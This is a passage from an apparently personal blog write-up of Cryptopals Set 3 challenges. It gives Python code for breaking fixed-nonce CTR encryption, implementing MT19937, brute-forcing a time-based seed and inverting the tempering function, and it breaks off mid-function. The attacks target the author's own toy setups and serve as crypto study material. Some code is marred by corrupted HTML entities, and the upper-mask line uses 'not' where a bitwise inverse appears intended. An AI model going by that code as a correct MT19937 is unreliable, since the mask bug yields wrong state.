In successive encryptions (not in one big running CTR stream), encrypt each line of the base64 decodes of the following, producing multiple independent ciphertexts:<br>
<strong>SSBoYXZlIG1ldCB0aGVtIGF0IGNsb3NlIG9mIGRheQ==</strong><br>
<strong>Q29taW5nIHdpdGggdml2aWQgZmFjZXM=</strong><br>
<strong>RnJvbSBjb3VudGVyIG9yIGRlc2sgYW1vbmcgZ3JleQ==</strong><br>
<strong>RWlnaHRlZW50aC1jZW50dXJ5IGhvdXNlcy4=</strong><br>
<strong>SSBoYXZlIHBhc3NlZCB3aXRoIGEgbm9kIG9mIHRoZSBoZWFk</strong><br>
<strong>T3IgcG9saXRlIG1lYW5pbmdsZXNzIHdvcmRzLA==</strong><br>
<strong>T3IgaGF2ZSBsaW5nZXJlZCBhd2hpbGUgYW5kIHNhaWQ=</strong><br>
<strong>UG9saXRlIG1lYW5pbmdsZXNzIHdvcmRzLA==</strong><br>
<strong>QW5kIHRob3VnaHQgYmVmb3JlIEkgaGFkIGRvbmU=</strong><br>
<strong>T2YgYSBtb2NraW5nIHRhbGUgb3IgYSBnaWJl</strong><br>
<strong>VG8gcGxlYXNlIGEgY29tcGFuaW9u</strong><br>
<strong>QXJvdW5kIHRoZSBmaXJlIGF0IHRoZSBjbHViLA==</strong><br>
<strong>QmVpbmcgY2VydGFpbiB0aGF0IHRoZXkgYW5kIEk=</strong><br>
<strong>QnV0IGxpdmVkIHdoZXJlIG1vdGxleSBpcyB3b3JuOg==</strong><br>
<strong>QWxsIGNoYW5nZWQsIGNoYW5nZWQgdXR0ZXJseTo=</strong><br>
<strong>QSB0ZXJyaWJsZSBiZWF1dHkgaXMgYm9ybi4=</strong><br>
<strong>VGhhdCB3b21hbidzIGRheXMgd2VyZSBzcGVudA==</strong><br>
<strong>SW4gaWdub3JhbnQgZ29vZCB3aWxsLA==</strong><br>
<strong>SGVyIG5pZ2h0cyBpbiBhcmd1bWVudA==</strong><br>
<strong>VW50aWwgaGVyIHZvaWNlIGdyZXcgc2hyaWxsLg==</strong><br>
<strong>V2hhdCB2b2ljZSBtb3JlIHN3ZWV0IHRoYW4gaGVycw==</strong><br>
<strong>V2hlbiB5b3VuZyBhbmQgYmVhdXRpZnVsLA==</strong><br>
<strong>U2hlIHJvZGUgdG8gaGFycmllcnM/</strong><br>
<strong>VGhpcyBtYW4gaGFkIGtlcHQgYSBzY2hvb2w=</strong><br>
<strong>QW5kIHJvZGUgb3VyIHdpbmdlZCBob3JzZS4=</strong><br>
<strong>VGhpcyBvdGhlciBoaXMgaGVscGVyIGFuZCBmcmllbmQ=</strong><br>
<strong>V2FzIGNvbWluZyBpbnRvIGhpcyBmb3JjZTs=</strong><br>
<strong>SGUgbWlnaHQgaGF2ZSB3b24gZmFtZSBpbiB0aGUgZW5kLA==</strong><br>
<strong>U28gc2Vuc2l0aXZlIGhpcyBuYXR1cmUgc2VlbWVkLA==</strong><br>
<strong>U28gZGFyaW5nIGFuZCBzd2VldCBoaXMgdGhvdWdodC4=</strong><br>
<strong>VGhpcyBvdGhlciBtYW4gSSBoYWQgZHJlYW1lZA==</strong><br>
<strong>QSBkcnVua2VuLCB2YWluLWdsb3Jpb3VzIGxvdXQu</strong><br>
<strong>SGUgaGFkIGRvbmUgbW9zdCBiaXR0ZXIgd3Jvbmc=</strong><br>
<strong>VG8gc29tZSB3aG8gYXJlIG5lYXIgbXkgaGVhcnQs</strong><br>
<strong>WWV0IEkgbnVtYmVyIGhpbSBpbiB0aGUgc29uZzs=</strong><br>
<strong>SGUsIHRvbywgaGFzIHJlc2lnbmVkIGhpcyBwYXJ0</strong><br>
<strong>SW4gdGhlIGNhc3VhbCBjb21lZHk7</strong><br>
<strong>SGUsIHRvbywgaGFzIGJlZW4gY2hhbmdlZCBpbiBoaXMgdHVybiw=</strong><br>
<strong>VHJhbnNmb3JtZWQgdXR0ZXJseTo=</strong><br>
<strong>QSB0ZXJyaWJsZSBiZWF1dHkgaXMgYm9ybi4=</strong><br>
(This should produce 40 short CTR-encrypted ciphertexts).<br>
Because the CTR nonce wasn&rsquo;t randomized for each encryption, each ciphertext has been encrypted against the same keystream. This is very bad.<br>
Understanding that, like most stream ciphers (including RC4, and obviously any block cipher run in CTR mode), the actual &ldquo;encryption&rdquo; of a byte of data boils down to a single XOR operation, it should be plain that:<br>
<strong>CIPHERTEXT-BYTE XOR PLAINTEXT-BYTE = KEYSTREAM-BYTE</strong><br>
And since the keystream is the same for every ciphertext:<br>
<strong>CIPHERTEXT-BYTE XOR KEYSTREAM-BYTE = PLAINTEXT-BYTE (ie, &ldquo;you don&rsquo;t say!&quot;)</strong><br>
Attack this cryptosystem piecemeal: guess letters, use expected English language frequence to validate guesses, catch common English trigrams, and so on.</p>
</blockquote>
<p>and</p>
<h3 id="challenge-20-break-fixed-nonce-ctr-statistically">Challenge 20: Break fixed-nonce CTR statistically</h3>
<p><a href="https://cryptopals.com/sets/3/challenges/20">Link</a></p>
<blockquote>
<p><a href="https://cryptopals.com/static/challenge-data/20.txt">In this file</a> find a similar set of Base64&rsquo;d plaintext. Do with them exactly what you did with the first, but solve the problem differently.<br>
Instead of making spot guesses at to known plaintext, treat the collection of ciphertexts the same way you would repeating-key XOR.<br>
Obviously, CTR encryption appears different from repeated-key XOR, but with a fixed nonce they are effectively the same thing.<br>
To exploit this: take your collection of ciphertexts and truncate them to a common length (the length of the smallest ciphertext will work).<br>
Solve the resulting concatenation of ciphertexts as if for repeating- key XOR, with a key size of the length of the ciphertext you XOR&rsquo;d.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> base64

<span style="color:#75715e"># Given</span>
b64_strings <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;20.txt&#34;</span>)<span style="color:#f92672">.</span>readlines()
nonce <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>

random_key <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)
decoded_strings <span style="color:#f92672">=</span> [base64<span style="color:#f92672">.</span>b64decode(line<span style="color:#f92672">.</span>strip()) <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> b64_strings]
ciphertext_list <span style="color:#f92672">=</span> [CTR(string, random_key, nonce) <span style="color:#66d9ef">for</span> string <span style="color:#f92672">in</span> decoded_strings]
min_ciphertext_length <span style="color:#f92672">=</span> min(map(len, ciphertext_list))
</code></pre></div><p>The thing to note here is the fact that the same keystream is used to encrypt all the strings provided in the file. Therefore, if we stack all the ciphertext strings one on top of the other, it becomes clear that all the Nth byte in each of the ciphertext strings have been encrypted by the Nth byte of the keystream. Therefore, it can be considered to be a case of single-byte xor.</p>
<p>The function extends the idea from #6: create blocks of the bytes at same indices from all the ciphertext strings, and then solve them based on the score from letters.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">columns <span style="color:#f92672">=</span> []
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(min_ciphertext_length):
    line <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
    <span style="color:#66d9ef">for</span> cipher <span style="color:#f92672">in</span> ciphertext_list:
        line <span style="color:#f92672">+=</span> cipher[i]<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;big&#34;</span>)
    result <span style="color:#f92672">=</span> single_byte_xor_score(line)
    columns<span style="color:#f92672">.</span>append(result[<span style="color:#e6db74">&#34;message&#34;</span>])

message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(min_ciphertext_length):
    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> columns:
        message <span style="color:#f92672">+=</span> c[i]

message
</code></pre></div><p><code>'N\'m rated &quot;R&quot;...this is a warning, ya better void / PDuz I came back to attack others in spite- / Strike lEut don\'t be afraid in the dark, in a park / Not a sc^a tremble like a alcoholic, muscles tighten up / WhaTuddenly you feel like your in a horror flick / You gJusic\'s the clue, when I come your warned / ApocalypsOaven\'t you ever heard of a MC-murderer? / This is thCeath wish, so come on, step to this / Hysterical ideAriday the thirteenth, walking down Elm Street / You Shis is off limits, so your visions are blurry / All Serror in the styles, never error-files / Indeed I\'m Aor those that oppose to be level or next to this / IPorse than a nightmare, you don\'t have to sleep a winAlashbacks interfere, ya start to hear: / The R-A-K-IShen the beat is hysterical / That makes Eric go get Toon the lyrical format is superior / Faces of death JC\'s decaying, cuz they never stayed / The scene of aShe fiend of a rhyme on the mic that you know / It\'s Jelodies-unmakable, pattern-unescapable / A horn if wN bless the child, the earth, the gods and bomb the rOazardous to your health so be friendly / A matter ofThake \'till your clear, make it disappear, make the nNf not, my soul\'ll release! / The scene is recreated,Duz your about to see a disastrous sight / A performaKyrics of fury! A fearified freestyle! / The &quot;R&quot; is iJake sure the system\'s loud when I mention / Phrases ^ou want to hear some sounds that not only pounds butShen nonchalantly tell you what it mean to me / StricFnd I don\'t care if the whole crowd\'s a witness! / I\'Wrogram into the speed of the rhyme, prepare to startJusical madness MC ever made, see it\'s / Now an emergHpen your mind, you will find every word\'ll be / FuriEattle\'s tempting...whatever suits ya! / For words th^ou think you\'re ruffer, then suffer the consequencesN wake ya with hundreds of thousands of volts / Mic-tIovocain ease the pain it might save him / If not, Er^o Rakim, what\'s up? / Yo, I\'m doing the knowledge, EPell, check this out, since Norby Walters is our agenLara Lewis is our agent, word up / Zakia and 4th and Hkay, so who we rollin\' with then? We rollin\' with RuDheck this out, since we talking over / This def beatN wanna hear some of them def rhymes, you know what IShinkin\' of a master plan / \'Cuz ain\'t nuthin\' but swTo I dig into my pocket, all my money is spent / So ITo I start my mission, leave my residence / Thinkin\' N need money, I used to be a stick-up kid / So I thinN used to roll up, this is a hold up, ain\'t nuthin\' fEut now I learned to earn \'cuz I\'m righteous / I feelTearch for a nine to five, if I strive / Then maybe ITo I walk up the street whistlin\' this / Feelin\' out F pen and a paper, a stereo, a tape of / Me and Eric Aish, which is my favorite dish / But without no mone Cuz I don\'t like to dream about gettin\' paid / So I '</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-21-implement-the-mt19937-mersenne-twister-rng">Challenge 21: Implement the MT19937 Mersenne Twister RNG</h3>
<p><a href="https://cryptopals.com/sets/3/challenges/21">Link</a></p>
<blockquote>
<p>You can get the psuedocode for this from Wikipedia.<br>
If you&rsquo;re writing in Python, Ruby, or (gah) PHP, your language is probably already giving you MT19937 as &ldquo;rand()&quot;; don&rsquo;t use rand(). Write the RNG yourself.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> time
</code></pre></div><p>The <a href="https://stackedit.io/%5Bhttps://en.wikipedia.org/wiki/Mersenne_Twister%5D(https://en.wikipedia.org/wiki/Mersenne_Twister)">Mersenne Twister</a> is a pseudorandom number generator (PRNG). It is by far the most widely used general-purpose PRNG. It&rsquo;s name derives from the fact that its period length is chosen to be a <a href="https://stackedit.io/%5B%5Bhttps://en.wikipedia.org/wiki/Mersenne_prime%5D(https://en.wikipedia.org/wiki/Mersenne_prime)%5D(https://en.wikipedia.org/wiki/Mersenne_Twister)">Mersenne prime</a>.</p>
<p>The implementation is derived from the pseudo-code on Wikipedia. Any of the above links can be used to study more on the topic.</p>
<p><img src="/Cryptopals_Set_3/4_image.png" alt="&ldquo;mersenne_twister&rdquo;">
<em>Mersenne Twister.</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_lowest_bits</span>(n: int, number_of_bits: int) <span style="color:#f92672">-&gt;</span> int:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Returns the lowest &#34;number_of_bits&#34; bits of n.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    mask <span style="color:#f92672">=</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> number_of_bits) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
    <span style="color:#66d9ef">return</span> n <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; mask

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MT19937</span>:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    This implementation resembles the one of the Wikipedia pseudo-code.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>

    W, N, M, R <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">624</span>, <span style="color:#ae81ff">397</span>, <span style="color:#ae81ff">31</span>
    A <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9908B0DF</span>
    U, D <span style="color:#f92672">=</span> <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">0xFFFFFFFF</span>
    S, B <span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0x9D2C5680</span>
    T, C <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">0xEFC60000</span>
    L <span style="color:#f92672">=</span> <span style="color:#ae81ff">18</span>
    F <span style="color:#f92672">=</span> <span style="color:#ae81ff">1812433253</span>
    LOWER_MASK <span style="color:#f92672">=</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> R) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
    UPPER_MASK <span style="color:#f92672">=</span> get_lowest_bits(<span style="color:#f92672">not</span> LOWER_MASK, W)
    
    <span style="color:#66d9ef">def</span> __init__(self: object, seed: int):
        self<span style="color:#f92672">.</span>mt <span style="color:#f92672">=</span> []

        self<span style="color:#f92672">.</span>index <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>N
        self<span style="color:#f92672">.</span>mt<span style="color:#f92672">.</span>append(seed)
        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, self<span style="color:#f92672">.</span>index):
            self<span style="color:#f92672">.</span>mt<span style="color:#f92672">.</span>append(get_lowest_bits(self<span style="color:#f92672">.</span>F <span style="color:#f92672">*</span> (self<span style="color:#f92672">.</span>mt[i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">^</span> (self<span style="color:#f92672">.</span>mt[i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">&gt;&gt;</span> (self<span style="color:#f92672">.</span>W <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>))) <span style="color:#f92672">+</span> i, self<span style="color:#f92672">.</span>W))
            
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extract_number</span>(self: object) <span style="color:#f92672">-&gt;</span> int:
        <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">        Extracts the new random number.
</span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>index <span style="color:#f92672">&gt;=</span> self<span style="color:#f92672">.</span>N:
            self<span style="color:#f92672">.</span>twist()

        y <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>mt[self<span style="color:#f92672">.</span>index]
        y <span style="color:#f92672">^=</span> (y <span style="color:#f92672">&gt;&gt;</span> self<span style="color:#f92672">.</span>U) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; self<span style="color:#f92672">.</span>D
        y <span style="color:#f92672">^=</span> (y <span style="color:#f92672">&lt;&lt;</span> self<span style="color:#f92672">.</span>S) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; self<span style="color:#f92672">.</span>B
        y <span style="color:#f92672">^=</span> (y <span style="color:#f92672">&lt;&lt;</span> self<span style="color:#f92672">.</span>T) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; self<span style="color:#f92672">.</span>C
        y <span style="color:#f92672">^=</span> (y <span style="color:#f92672">&gt;&gt;</span> self<span style="color:#f92672">.</span>L)

        self<span style="color:#f92672">.</span>index <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
        <span style="color:#66d9ef">return</span> get_lowest_bits(y, self<span style="color:#f92672">.</span>W)

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">twist</span>(self: object):
        <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">        Performs the twisting part of the encryption.
</span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(self<span style="color:#f92672">.</span>N):
            x <span style="color:#f92672">=</span> (self<span style="color:#f92672">.</span>mt[i] <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; self<span style="color:#f92672">.</span>UPPER_MASK) <span style="color:#f92672">+</span> (self<span style="color:#f92672">.</span>mt[(i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>N] <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; self<span style="color:#f92672">.</span>LOWER_MASK)
            x_a <span style="color:#f92672">=</span> x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>
            <span style="color:#66d9ef">if</span> x <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
                x_a <span style="color:#f92672">^=</span> self<span style="color:#f92672">.</span>A

            self<span style="color:#f92672">.</span>mt[i] <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>mt[(i <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>M) <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>N] <span style="color:#f92672">^</span> x_a

        self<span style="color:#f92672">.</span>index <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Check if the numbers look random</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
    <span style="color:#66d9ef">print</span>(MT19937(i)<span style="color:#f92672">.</span>extract_number())
</code></pre></div><p><code>2357136044</code><br>
<code>1791095845</code><br>
<code>1872583848</code><br>
<code>2365658986</code><br>
<code>4153361530</code><br>
<code>953453411</code><br>
<code>3834805130</code><br>
<code>327741615</code><br>
<code>3751350723</code><br>
<code>44556670</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-22-crack-an-mt19937-seed">Challenge 22: Crack an MT19937 seed</h3>
<p><a href="https://cryptopals.com/sets/3/challenges/22">Link</a></p>
<blockquote>
<p>Make sure your MT19937 accepts an integer seed value. Test it (verify that you&rsquo;re getting the same sequence of outputs given a seed).<br>
Write a routine that performs the following operation:</p>
<ol>
<li>Wait a random number of seconds between, I don&rsquo;t know, 40 and 1000.</li>
<li>Seeds the RNG with the current Unix timestamp.</li>
<li>Waits a random number of seconds again.</li>
<li>Returns the first 32 bit output of the RNG.</li>
</ol>
<p>You get the idea. Go get coffee while it runs. Or just simulate the passage of time, although you&rsquo;re missing some of the fun of this exercise if you do that.<br>
From the 32 bit RNG output, discover the seed.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    <span style="color:#75715e"># Imports</span>
    <span style="color:#f92672">import</span> time
    <span style="color:#f92672">import</span> random
</code></pre></div><p>The point of this function is to generate a time-based seed, but to throw off the attacker by executing a <code>sleep</code> for a random time before generating the seed and again for a random time after generating it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">MT19937_timestamp_seed</span>() <span style="color:#f92672">-&gt;</span> (int, int):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Generates a timestamp based seed for MT19937.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    <span style="color:#75715e"># Sleeps for a random time to generate a random seed.</span>
    time<span style="color:#f92672">.</span>sleep(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">100</span>))
    seed <span style="color:#f92672">=</span> int(time<span style="color:#f92672">.</span>time())
    
    <span style="color:#75715e"># Initialises the object with the generated seed.</span>
    mt_rng <span style="color:#f92672">=</span> MT19937(seed)
    
    <span style="color:#75715e"># Sleep for a random time to throw off the attacker.</span>
    time<span style="color:#f92672">.</span>sleep(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">100</span>))
    <span style="color:#66d9ef">return</span> mt_rng<span style="color:#f92672">.</span>extract_number(), seed
</code></pre></div><p>We brute force the seed value by approximating the maximum time spent between generation of the seed and the value returned to us (I took it to be 200), </p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">break_MT19937_seed</span>(rng_function: callable) <span style="color:#f92672">-&gt;</span> int:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Breaks the MT19937 seed value.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    random_number, real_seed <span style="color:#f92672">=</span> rng_function()
    
    <span style="color:#75715e"># Note current time to start backtracking by the millisecond.</span>
    now <span style="color:#f92672">=</span> int(time<span style="color:#f92672">.</span>time())
    
    <span style="color:#75715e"># Assuming 200 seconds to be the maximum time between generation of seed and us receiving it.</span>
    before <span style="color:#f92672">=</span> now <span style="color:#f92672">-</span> <span style="color:#ae81ff">200</span>
    <span style="color:#75715e"># Brtue force with the value of seed between the set time frame.</span>
    <span style="color:#66d9ef">for</span> seed <span style="color:#f92672">in</span> range(before, now):
        rng <span style="color:#f92672">=</span> MT19937(seed)
        number <span style="color:#f92672">=</span> rng<span style="color:#f92672">.</span>extract_number()
        <span style="color:#66d9ef">if</span> number <span style="color:#f92672">==</span> random_number:
            <span style="color:#66d9ef">return</span> seed

number <span style="color:#f92672">=</span> break_MT19937_seed(MT19937_timestamp_seed)
</code></pre></div>

<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-23-clone-an-mt19937-rng-from-its-output">Challenge 23: Clone an MT19937 RNG from its output</h3>
<p><a href="https://cryptopals.com/sets/3/challenges/23">Link</a></p>
<blockquote>
<p>The internal state of MT19937 consists of 624 32 bit integers.<br>
For each batch of 624 outputs, MT permutes that internal state. By permuting state regularly, MT19937 achieves a period of 2**19937, which is Big.<br>
Each time MT19937 is tapped, an element of its internal state is subjected to a tempering function that diffuses bits through the result.<br>
The tempering function is invertible; you can write an &ldquo;untemper&rdquo; function that takes an MT19937 output and transforms it back into the corresponding element of the MT19937 state array.<br>
To invert the temper transform, apply the inverse of each of the operations in the temper transform in reverse order. There are two kinds of operations in the temper transform each applied twice; one is an XOR against a right-shifted value, and the other is an XOR against a left-shifted value AND&rsquo;d with a magic number. So you&rsquo;ll need code to invert the &ldquo;right&rdquo; and the &ldquo;left&rdquo; operation.<br>
Once you have &ldquo;untemper&rdquo; working, create a new MT19937 generator, tap it for 624 outputs, untemper each of them to recreate the state of the generator, and splice that state into a new instance of the MT19937 generator.<br>
The new &ldquo;spliced&rdquo; generator should predict the values of the original.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> time
<span style="color:#f92672">import</span> random
</code></pre></div><p>The major ground work to be done here is to reverse the temper function, that is, to create an “untempering” function. Since the question tells us that the tempering function is invertible, writing such a function is possible. Have a go at it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">int_to_bit_list</span>(x: int) <span style="color:#f92672">-&gt;</span> list:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Convert an integer to it&#39;s binary form, and return the bits in a list.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">return</span> [int(b) <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> <span style="color:#e6db74">&#34;{:032b}&#34;</span><span style="color:#f92672">.</span>format(x)]

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">bit_list_to_int</span>(l: list) <span style="color:#f92672">-&gt;</span> int:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Receive a list of bits and convert it into an integer.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">return</span> int(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(str(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> l), base<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">invert_shift_mask_xor</span>(y: int, direction: str, shift: int, mask<span style="color:#f92672">=</span><span style="color:#ae81ff">0xFFFFFFFF</span>) <span style="color:#f92672">-&gt;</span> int:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Shift, mask and xor the given integer in the specified direction with the passed mask.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    y <span style="color:#f92672">=</span> int_to_bit_list(y)
    mask <span style="color:#f92672">=</span> int_to_bit_list(mask)

    <span style="color:#66d9ef">if</span> direction <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;left&#34;</span>:
        y<span style="color:#f92672">.</span>reverse()
        mask<span style="color:#f92672">.</span>reverse()
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">assert</span> direction <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;right&#34;</span>

    x <span style="color:#f92672">=</span> [None]<span style="color:#f92672">*</span><span style="color:#ae81ff">32</span>
    <span style="color:#66d9ef">for</span> n <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>):
        <span style="color:#66d9ef">if</span> n <span style="color:#f92672">&lt;</span> shift:
            x[n] <span style="color:#f92672">=</span> y[n]
        <span style="color:#66d9ef">else</span>:
            x[n] <span style="color:#f92672">=</span> y[n] <span style="color:#f92672">^</span> (mask[n] <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; x[n<span style="color:#f92672">-</span>shift])

    <span style="color:#66d9ef">if</span> direction <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;left&#39;</span>:
        x<span style="color:#f92672">.</span>reverse()

    <span style="color:#66d9ef">return</span> bit_list_to_int(x)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">untemper</span>(y: int) <span style="color:#f92672">-&gt;</span> int:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Reverses the temper part of the Mersenne Twister.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    (w, n, m, r) <span style="color:#f92672">=</span> (<span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">624</span>, <span style="color:#ae81ff">397</span>, <span style="color:#ae81ff">31</span>)
    a <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9908B0DF</span>
    (u, d) <span style="color:#f92672">=</span> (<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">0xFFFFFFFF</span>)
    (s, b) <span style="color:#f92672">=</span> (<span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0x9D2C5680</span>)
    (t, c) <span style="color:#f92672">=</span> (<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">0xEFC60000</span>)
    l <span style="color:#f92672">=</span> <span style="color:#ae81ff">18</span>
    f <span style="color:#f92672">=</span> <span style="color:#ae81ff">1812433253</span>

    xx <span style="color:#f92672">=</span> y
    xx <span style="color:#f92672">=</span> invert_shift_mask_xor(xx, direction<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;right&#39;</span>, shift<span style="color:#f92672">=</span>l)
    xx <span style="color:#f92672">=</span> invert_shift_mask_xor(xx, direction<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;left&#39;</span>, shift<span style="color:#f92672">=</span>t, mask<span style="color:#f92672">=</span>c)
    xx <span style="color:#f92672">=</span> invert_shift_mask_xor(xx, direction<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;left&#39;</span>, shift<span style="color:#f92672">=</span>s, mask<span style="color:#f92672">=</span>b)
